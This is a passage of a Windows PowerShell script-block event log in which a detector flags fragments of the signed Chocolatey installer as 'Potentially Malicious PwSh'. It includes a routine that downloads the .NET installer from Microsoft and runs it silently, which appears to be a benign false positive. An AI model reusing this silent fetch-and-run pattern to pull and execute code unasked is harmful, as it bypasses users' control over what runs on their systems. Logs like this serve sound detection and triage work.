/WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkq","MessageNumber: 3 ¦ MessageTotal: 4 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateysetup.psm1 ¦ ScriptBlockId: bb48825e-ea49-4f0d-bb5c-2b2443dd9239 ¦ ScriptBlockText: ning ""Tab completion does not currently work in PowerShell v2. `n Please upgrade to a more recent version of PowerShell to take advantage of tab completion."" #Write-ChocolateyWarning ""To load tab expansion, you need to install PowerTab. `n See https://powertab.codeplex.com/ for details."" } } catch { Write-ChocolateyWarning ""Unable to add Chocolatey to the profile. You will need to do it manually. Error was '$_'"" @' This is how add the Chocolatey Profile manually. Find your $profile. Then add the following lines to it: $ChocolateyProfile = ""$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"" if (Test-Path($ChocolateyProfile)) { Import-Module ""$ChocolateyProfile"" } '@ | Write-Output } } $netFx4InstallTries = 0 function Install-DotNet4IfMissing { param( $forceFxInstall = $false ) # we can't take advantage of any chocolatey module functions, because they # haven't been unpacked because they require .NET Framework 4.0 Write-Debug ""Install-DotNet4IfMissing called with `$forceFxInstall=$forceFxInstall"" $NetFxArch = ""Framework"" if ([IntPtr]::Size -eq 8) {$NetFxArch=""Framework64"" } $NetFx4ClientUrl = 'https://download.microsoft.com/download/5/6/2/562A10F9-C9F4-4313-A044-9C94E0A8FAC8/dotNetFx40_Client_x86_x64.exe' $NetFx4FullUrl = 'https://download.microsoft.com/download/9/5/A/95A9616B-7A37-4AF6-BC36-D6EA96C8DAAE/dotNetFx40_Full_x86_x64.exe' $NetFx4Url = $NetFx4FullUrl $NetFx4Path = ""$tempDir"" $NetFx4InstallerFile = 'dotNetFx40_Full_x86_x64.exe' $NetFx4Installer = Join-Path $NetFx4Path $NetFx4InstallerFile if ((!(Test-Path ""$env:SystemRoot\Microsoft.Net\$NetFxArch\v4.0.30319"") -and !(Test-Path ""C:\Windows\Microsoft.Net\$NetFxArch\v4.0.30319"")) -or $forceFxInstall) { Write-Output ""'$env:SystemRoot\Microsoft.Net\$NetFxArch\v4.0.30319' was not found or this is forced"" if (!(Test-Path $NetFx4Path)) { Write-Output ""Creating folder `'$NetFx4Path`'"" $null = New-Item -Path ""$NetFx4Path"" -ItemType Directory } $netFx4InstallTries += 1 if (!(Test-Path $NetFx4Installer)) { Write-Output ""Downloading `'$NetFx4Url`' to `'$NetFx4Installer`' - the installer is 40+ MBs, so this could take a while on a slow connection."" (New-Object Net.WebClient).DownloadFile(""$NetFx4Url"",""$NetFx4Installer"") } $psi = New-Object System.Diagnostics.ProcessStartInfo $psi.WorkingDirectory = ""$NetFx4Path"" $psi.FileName = ""$NetFx4InstallerFile"" # https://msdn.microsoft.com/library/ee942965(v=VS.100).aspx#command_line_options # http://blogs.msdn.com/b/astebner/archive/2010/05/12/10011664.aspx # For the actual setup.exe (if you want to unpack first) - /repair /x86 /x64 /ia64 /parameterfolder Client /q /norestart $psi.Arguments = ""/q /norestart /repair"" Write-Output ""Installing `'$NetFx4Installer`' - this may take awhile with no output."" $s = [System.Diagnostics.Process]::Start($psi); $s.WaitForExit(); if ($s.ExitCode -ne 0 -and $s.ExitCode -ne 3010) { if ($netFx4InstallTries -ge 2) { Write-ChocolateyError "".NET Framework install failed with exit code `'$($s.ExitCode)`'. `n This will cause the rest of the install to fail."" throw ""Error installing .NET Framework 4.0 (exit code $($s.ExitCode)). `n Please install the .NET Framework 4.0 manually and then try to install Chocolatey again. `n Download at `'$NetFx4Url`'"" } else { Write-ChocolateyWarning ""Try #$netFx4InstallTries of .NET framework install failed with exit code `'$($s.ExitCode)`'. Trying again."" Install-DotNet4IfMissing $true } } } } function Invoke-Chocolatey-Initial { Write-Debug ""Initializing Chocolatey files, etc by running Chocolatey..."" try { $chocoInstallationFolder = Get-ChocolateyInstallFolder $chocoExe = Join-Path -Path $chocoInstallationFolder -ChildPath ""choco.exe"" & $chocoExe -v | Out-Null Write-Debug ""Chocolatey execution completed successfully."" } catch { Write-ChocolateyWarning ""Unable to run Chocolately at this time. It is likely that .Net Framework installation requires a system reboot"" } } Export-ModuleMember -function Initialize-Chocolatey; # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAkEkEipuZa+5py # 29A1WQhQQVpJYzMWl/kN8goJPe7XT6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkq","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:31.332 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,56,"ScriptBlock: hkiG9w0BCQQxIgQgyGw3TOXPIuzj74nlpBIZOXvt4b7qXy2ZLZGG # z9+qIdIwDQYJKoZIhvcNAQEBBQAEggEAZALl1Um2PYswYT8/Y1/SXoCKuEWuSI8I # FLg9h+Uuiggk1JBLBF8UcINirl7+oPP3gzu1zPkeGRgVL683hpTQVIi4940Cokpe # yDh8ZsuIAlhaHuSuiS+JpZUv76xUZcHyqhplUqLzMjE7gKwwcsAeRi35AY0PCWiD # 9dbAi3LCeqJhCGojvnbaW14IHHrZTakd1xRdusaxXqgKZjLOlbc799xXOk2iweOv # NfkiESVYJasINtv/cRrOth+MtkkXtoQZ2qZh936CbRtJsMkGpQQpmP6xD5x6E9iE # Yi0umDPuiXAfrOmWvWbPve9K5bG8kr9zCS5Z8Xgz4euf/5lWLuvOCaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzA0WjAjBgkqhkiG9w0BCQQxFgQUO9VKWspeRHabRIo2 # Zn3dKgBZguwwDQYJKoZIhvcNAQEBBQAEggEADP5N+bVm8jYIaPpZ3RCNk2VIH3wO # N9tTg23IL3Uj14ESguzM04QQJ7MmsOs51X4HzbvatHzGy3HtCRcmcWLhUZWvfXtH # 3PNbX4DigRUaYnt6cl3f/cUjLSgS/aOCuF3sxrmOSBU3lSUlhWsZ7CDwOwB8uIw0 # XWuJJ3T6CU+OuSyt2YyuXCDbzi19nrx+Hjic6O7KjiPnpkr72wNi00Km9iWFgJ0c # XNdq4z+X0NV2nOkeqLSz5XMi/tnry7nUj0xF2Pcq90Za5K3rHlJIMUAyA29Y0dz4 # CkFZGQvdCZ9weteetfIMVQAklIllNCiK1QCYmrLg/7qEVE6hHh/km3sZdg== # SIG # End signature block","MessageNumber: 4 ¦ MessageTotal: 4 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateysetup.psm1 ¦ ScriptBlockId: bb48825e-ea49-4f0d-bb5c-2b2443dd9239 ¦ ScriptBlockText: hkiG9w0BCQQxIgQgyGw3TOXPIuzj74nlpBIZOXvt4b7qXy2ZLZGG # z9+qIdIwDQYJKoZIhvcNAQEBBQAEggEAZALl1Um2PYswYT8/Y1/SXoCKuEWuSI8I # FLg9h+Uuiggk1JBLBF8UcINirl7+oPP3gzu1zPkeGRgVL683hpTQVIi4940Cokpe # yDh8ZsuIAlhaHuSuiS+JpZUv76xUZcHyqhplUqLzMjE7gKwwcsAeRi35AY0PCWiD # 9dbAi3LCeqJhCGojvnbaW14IHHrZTakd1xRdusaxXqgKZjLOlbc799xXOk2iweOv # NfkiESVYJasINtv/cRrOth+MtkkXtoQZ2qZh936CbRtJsMkGpQQpmP6xD5x6E9iE # Yi0umDPuiXAfrOmWvWbPve9K5bG8kr9zCS5Z8Xgz4euf/5lWLuvOCaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzA0WjAjBgkqhkiG9w0BCQQxFgQUO9VKWspeRHabRIo2 # Zn3dKgBZguwwDQYJKoZIhvcNAQEBBQAEggEADP5N+bVm8jYIaPpZ3RCNk2VIH3wO # N9tTg23IL3Uj14ESguzM04QQJ7MmsOs51X4HzbvatHzGy3HtCRcmcWLhUZWvfXtH # 3PNbX4DigRUaYnt6cl3f/cUjLSgS/aOCuF3sxrmOSBU3lSUlhWsZ7CDwOwB8uIw0 # XWuJJ3T6CU+OuSyt2YyuXCDbzi19nrx+Hjic6O7KjiPnpkr72wNi00Km9iWFgJ0c # XNdq4z+X0NV2nOkeqLSz5XMi/tnry7nUj0xF2Pcq90Za5K3rHlJIMUAyA29Y0dz4 # CkFZGQvdCZ9weteetfIMVQAklIllNCiK1QCYmrLg/7qEVE6hHh/km3sZdg== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:31.457 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,57,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. $helpersPath = (Split-Path -parent $MyInvocation.MyCommand.Definition); $global:DebugPreference = ""SilentlyContinue"" if ($env:ChocolateyEnvironmentDebug -eq 'true') { $global:DebugPreference = ""Continue""; } $global:VerbosePreference = ""SilentlyContinue"" if ($env:ChocolateyEnvironmentVerbose -eq 'true') { $global:VerbosePreference = ""Continue""; $verbosity = $true } $installArguments = $env:chocolateyInstallArguments $overrideArgs = $false if ($env:chocolateyInstallOverride -eq 'true') { $overrideArgs = $true } $forceX86 = $false if ($env:chocolateyForceX86 -eq 'true') { $forceX86 = $true } $packageParameters = $env:chocolateyPackageParameters # ensure module loading preference is on $PSModuleAutoLoadingPreference = ""All""; Write-Debug ""Host version is $($host.Version), PowerShell Version is '$($PSVersionTable.PSVersion)' and CLR 